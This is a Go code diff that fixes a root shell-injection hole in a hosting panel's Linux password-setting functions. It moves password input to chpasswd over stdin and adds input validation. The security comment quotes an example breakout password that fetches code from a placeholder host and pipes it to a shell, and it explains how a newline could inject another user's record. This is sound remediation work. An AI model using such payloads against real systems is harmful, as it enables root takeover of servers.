@@ -12,16 +12,34 @@ func CreateLinuxUser(ctx context.Context, username, password string) error {
 	if _, err := RunCommand(ctx, "useradd", "-m", "-s", "/bin/bash", username); err != nil {
 		return err
 	}
-	_, err := RunCommand(ctx, "bash", "-c", fmt.Sprintf("echo '%s:%s' | chpasswd", username, password))
-	return err
+	return setPasswordViaChpasswd(ctx, username, password)
 }
 
 // SetLinuxUserPassword updates the Linux account password for an existing
 // user via chpasswd. Used by the WHM admin "Reset password" action so SSH
 // and FTP credentials stay in sync with the panel password.
 func SetLinuxUserPassword(ctx context.Context, username, password string) error {
-	_, err := RunCommand(ctx, "bash", "-c",
-		fmt.Sprintf("echo '%s:%s' | chpasswd", username, password))
+	return setPasswordViaChpasswd(ctx, username, password)
+}
+
+// setPasswordViaChpasswd pipes "user:password" to chpasswd over STDIN, never a
+// shell string. Security (audit §11): the self-service "change my password"
+// flow and the WHM reset-password action both feed a fully user-chosen
+// password straight here; the old `bash -c "echo 'user:<pw>' | chpasswd"`
+// interpolated it inside single quotes, so a password like  x'; curl evil|sh; '
+// broke out and ran as root — a password-change → root RCE reachable by ANY
+// account (customer included). chpasswd reads newline-delimited "name:password"
+// records, so a newline in either field would inject a second record (another
+// user's password) — reject newlines, and a ':' in the username (the field
+// separator).
+func setPasswordViaChpasswd(ctx context.Context, username, password string) error {
+	if username == "" || strings.ContainsAny(username, ":\r\n") {
+		return fmt.Errorf("invalid username")
+	}
+	if strings.ContainsAny(password, "\r\n") {
+		return fmt.Errorf("password must not contain newlines")
+	}
+	_, err := RunCommandStdin(ctx, username+":"+password+"\n", "chpasswd")
 	return err
 }
 
